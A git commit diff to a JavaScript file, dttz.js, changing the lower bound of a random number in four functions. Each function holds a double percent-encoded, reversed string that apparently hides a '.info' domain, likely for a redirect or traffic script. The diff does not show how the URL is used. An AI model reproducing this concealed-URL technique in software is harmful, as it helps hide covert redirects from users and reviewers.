d2124fef88193b6598a7b3c94cb55c6a05b2ab43
fwqzx <zhen9903@gmail.com>
2017-07-30 08:41:03 -0700

    n

--- dttz.js
+++ dttz.js
@@ -9,7 +9,7 @@ function dttz01() {
 
 	var codedturlok="%25%36%66%25%36%36%25%36%65%25%36%39%25%32%65%25%33%33%25%33%30%25%33%30%25%33%31%25%32%64%25%37%38%25%36%65%25%36%35%25%36%38%25%37%61%25%37%34%25%36%34";
 	
-	var strR0=parseInt(Math.random()*3000,10)+1;
+	var strR0=parseInt(Math.random()*3000,10)+1001;
     
   var strR1=parseInt(Math.random()*10000,10)+1;
   var strR2=parseInt(Math.random()*10000,10)+1;
@@ -40,7 +40,7 @@ function dttz02() {
 	var codedturlok="%25%36%66%25%36%36%25%36%65%25%36%39%25%32%65%25%33%34%25%33%30%25%33%30%25%33%31%25%32%64%25%37%38%25%36%65%25%36%35%25%36%38%25%37%61%25%37%34%25%36%34";
 	
 	
-	var strR0=parseInt(Math.random()*3000,10)+1;
+	var strR0=parseInt(Math.random()*3000,10)+1001;
 	
   var strR1=parseInt(Math.random()*10000,10)+1;
   var strR2=parseInt(Math.random()*10000,10)+1;
@@ -72,7 +72,7 @@ function sttz01() {
 
 	var codedturlok="%25%36%66%25%36%36%25%36%65%25%36%39%25%32%65%25%33%33%25%33%30%25%33%30%25%33%31%25%32%64%25%37%38%25%36%65%25%36%35%25%36%38%25%37%61%25%37%34%25%36%34";
 	
-	var strR0=parseInt(Math.random()*3000,10)+1;
+	var strR0=parseInt(Math.random()*3000,10)+1001;
 	
 	
     
@@ -108,7 +108,7 @@ function sttz02() {
 	
 	
 	
-	var strR0=parseInt(Math.random()*3000,10)+1;
+	var strR0=parseInt(Math.random()*3000,10)+1001;
 	
     
   var strR1=parseInt(Math.random()*10000,10)+1;
